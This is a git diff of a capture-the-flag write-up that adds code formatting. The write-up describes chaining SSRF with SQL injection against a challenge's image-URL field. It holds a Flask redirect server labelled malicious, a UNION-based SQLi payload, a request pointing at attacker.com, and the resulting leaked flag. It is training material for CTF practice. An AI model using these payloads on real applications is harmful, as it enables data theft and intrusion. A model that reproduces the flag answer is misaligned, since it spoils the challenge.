@@ -7,7 +7,7 @@ It also looks for the Content-Type header to make sure it contains the word 'ima
 The username parameter is vuln to SQLi
 
 Example of malicious flask server:
-
+```
 from flask import Flask, redirect, Response
 
 app = Flask(__name__)
@@ -22,8 +22,10 @@ def redirect_to_internal():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8000)
+```
 
 ## exploiting
+```
 SQLi payload url-decoded:
 ' OR 1=1 UNION SELECT NULL,flag,NULL FROM flag limit 1 ---
 
@@ -32,3 +34,4 @@ name=test123&description=test123&image_url=http%3A%2F%2Fattacker.com%3A8000%2Fre
 
 Then you should get an error that looks like:
 Invalid image URL. Please provide a valid image URL. Response was: [ { "id": null, "username": "SIVUSCG{whoopsies_SSRF_here!}" } ]
+```
